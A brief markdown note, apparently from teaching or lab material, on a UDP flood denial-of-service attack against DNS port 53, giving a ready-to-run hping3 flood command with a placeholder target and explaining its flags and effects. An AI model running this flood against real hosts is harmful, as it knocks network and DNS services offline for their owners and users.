# UDP Flood Attack

## Effects:
- CPU usage increases due to high packet processing.
- If the DNS service is running, the network may become slow or unavailable.

## Command:
```bash
sudo hping3 --udp --flood -p 53 <IP Target>
```

## Explanation:

- `--udp` → Sends UDP packets, which are stateless and don't expect replies.
- `--flood` → Runs the attack continuously.
- `-p 53` → Targets DNS port 53.
